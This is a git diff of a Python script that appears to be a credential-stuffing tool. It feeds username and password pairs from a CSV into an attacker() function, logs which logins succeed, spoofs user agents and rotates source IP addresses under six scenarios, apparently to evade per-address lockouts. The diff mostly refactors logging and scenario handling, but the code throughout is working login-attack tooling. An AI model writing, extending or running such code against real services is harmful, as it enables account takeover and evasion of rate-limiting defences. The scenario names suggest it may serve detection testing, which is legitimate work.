@@ -2,17 +2,30 @@
 
 import configparser
 import csv
+import logging
 import os
 import random
 import subprocess
 import sys
-from datetime import datetime
+from logging import DEBUG, StreamHandler, getLogger
 from time import sleep
 
 import requests
 from fake_useragent import UserAgent
 
 import ipaddr
+
+logger = getLogger(__name__)
+handler = StreamHandler()
+handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y/%m/%d %I:%M:%S'))
+handler.setLevel(DEBUG)
+logger.setLevel(DEBUG)
+logger.addHandler(handler)
+logger.propagate = False
+
+
+def path(file_name):
+    return os.path.normpath(os.path.join(os.path.abspath('__file__'), '../{}'.format(file_name)))
 
 
 def gen_ipaddr(ip_type, count):
@@ -22,7 +35,7 @@ def gen_ipaddr(ip_type, count):
     elif ip_type == "increment":
         return ipaddr.IPv4Address(int(network.network) + count)
     else:
-        print("{} don't exsit setting. you should set random or increment. ".format(ip_type))
+        logger.debug("{} don't exsit setting. you should set random or increment. ".format(ip_type))
         sys.exit(1)
 
 
@@ -115,29 +128,29 @@ def attacker(user, pass_, config):
             result = "Succeeded"
         else:
             result = "Failed"
-        now = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
-        print("{} , User: {}, Pass: {}, Result: {}".format(now, user, pass_, result))
+        logger.debug("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
     else:
-        print("response doesn't exsit. maybe, one or more http-headers are wrong.")
+        logger.debug("response doesn't exsit. maybe, one or more http-headers are wrong.")
     interval(config)
 
 
 def do_scenario(ip_type, count):
-    now = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
     ip = gen_ipaddr(ip_type, count)
     change_ipaddr(ip)
-    print("{} , ipaddress changed {}, chamged count {}".format(now, ip, count))
+    logger.debug("ipaddress changed {}, chamged count {}".format(ip, count))
 
 
 def main():
     config = configparser.SafeConfigParser()
-    config.read((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attacker.conf'))))
-    try:
-        scenario = config.get('general', 'scenario')
-    except Exception as e:
-        print(e)
+    print(path('attacker.conf'))
+    config.read(path('attacker.conf'))
 
-    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
+    if config.get('general', 'scenario'):
+        scenario = config.get('general', 'scenario')
+    else:
+        scenario = ""
+
+    with open(path('account_list.csv')) as f:
         reader = csv.reader(f)
         if config.get('general', 'account') == "username":
             account = 0
@@ -151,34 +164,33 @@ def main():
         param = 10
 
         for row in reader:
-            if 'scenario' in locals():
-                if scenario == "test1":
+            if scenario == "test1":
+                do_scenario("random", count)
+                count += 1
+            elif scenario == "test2":
+                do_scenario("increment", count)
+                count += 1
+            elif scenario == "test3":
+                if (reader.line_num % param) == 0 or count == 1:
                     do_scenario("random", count)
                     count += 1
-                elif scenario == "test2":
+            elif scenario == "test4":
+                if (reader.line_num % param) == 0 or count == 1:
                     do_scenario("increment", count)
                     count += 1
-                elif scenario == "test3":
-                    if (reader.line_num % param) == 0:
-                        do_scenario("random", count)
-                        count += 1
-                elif scenario == "test4":
-                    if (reader.line_num % param) == 0:
-                        do_scenario("increment", count)
-                        count += 1
-                elif scenario == "test5":
-                    if (reader.line_num % random.randint(1, 20)) == 0:
-                        do_scenario("random", count)
-                        count += 1
-                elif scenario == "test6":
-                    if (reader.line_num % random.randint(1, 20)) == 0:
-                        do_scenario("increment", count)
-                        count += 1
-                else:
-                    print("{} doesn't exsit setting. you should set test1~test6. ".format(scenario))
-                    sys.exit(1)
+            elif scenario == "test5":
+                if (reader.line_num % random.randint(1, 20)) == 0 or count == 1:
+                    do_scenario("random", count)
+                    count += 1
+            elif scenario == "test6":
+                if (reader.line_num % random.randint(1, 20)) == 0 or count == 1:
+                    do_scenario("increment", count)
+                    count += 1
+            else:
+                logger.debug("{} doesn't exsit setting. you should set test1~test6. ".format(scenario))
+                sys.exit(1)
 
-                attacker(str(row[account]), str(row[2]), config)
+            attacker(str(row[account]), str(row[2]), config)
 
 
 if __name__ == '__main__':
